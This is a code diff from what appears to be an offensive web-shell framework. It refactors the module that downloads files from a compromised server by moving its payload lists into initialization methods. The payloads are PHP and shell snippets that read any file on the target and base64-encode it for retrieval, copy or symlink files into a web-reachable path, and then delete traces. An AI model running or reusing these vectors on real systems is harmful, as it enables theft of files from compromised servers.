@@ -16,31 +16,33 @@ import os
 WARN_NO_SUCH_FILE = 'No such file or permission denied'
 
 class Download(ModuleProbeAll):
-    '''Download binary/ascii files from target filesystem
-:file.download <remote path> <locale path>
-    '''
+    '''Download binary/ascii files from target filesystem'''
 
-    vectors = VectorList([
-        V('shell.php', 'file', "print(@base64_encode(implode('', file('$rpath'))));"),
-        V('shell.php', 'fread', "$f='$rpath'; print(@base64_encode(fread(fopen($f,'rb'),filesize($f))));"),
-        V('shell.php', "file_get_contents", "print(@base64_encode(file_get_contents('$rpath')));"),
-        V('shell.sh',  "base64", "base64 -w 0 $rpath"),
-        V('shell.php', "copy", "(copy('compress.zlib://$rpath','$downloadpath') && print(1)) || print(0);"),
-        V('shell.php',  "symlink", "(symlink('$rpath','$downloadpath') && print(1)) || print(0);")
-    ])
 
-    support_vectors = VectorList([
-        V('file.check',  "check_readable", "$rpath read".split(' ')),
-        V('file.upload2web', 'upload2web', '$rand -content 1'.split(' ')),
-        V('file.rm', 'remove', '$rpath'),
-        V('file.check', 'md5', '$rpath md5'.split(' ')),
-    ])
+        
+    def _init_vectors(self):
 
-    argparser = ArgumentParser(usage=__doc__)
-    argparser.add_argument('rpath')
-    argparser.add_argument('lpath')
-    argparser.add_argument('-vector', choices = vectors.get_names())
+        self.vectors = VectorList([
+            V('shell.php', 'file', "print(@base64_encode(implode('', file('$rpath'))));"),
+            V('shell.php', 'fread', "$f='$rpath'; print(@base64_encode(fread(fopen($f,'rb'),filesize($f))));"),
+            V('shell.php', "file_get_contents", "print(@base64_encode(file_get_contents('$rpath')));"),
+            V('shell.sh',  "base64", "base64 -w 0 $rpath"),
+            V('shell.php', "copy", "(copy('compress.zlib://$rpath','$downloadpath') && print(1)) || print(0);"),
+            V('shell.php',  "symlink", "(symlink('$rpath','$downloadpath') && print(1)) || print(0);")
+        ])
     
+        self.support_vectors = VectorList([
+            V('file.check',  "check_readable", "$rpath read".split(' ')),
+            V('file.upload2web', 'upload2web', '$rand -content 1'.split(' ')),
+            V('file.rm', 'remove', '$rpath'),
+            V('file.check', 'md5', '$rpath md5'.split(' ')),
+        ])
+    
+    def _init_args(self):
+        self.argparser.add_argument('rpath')
+        self.argparser.add_argument('lpath')
+        self.argparser.add_argument('-vector', choices = self.vectors.get_names())
+        
     def _prepare_probe(self):
         self.transfer_dir = None
         self.lastreadfile = ''
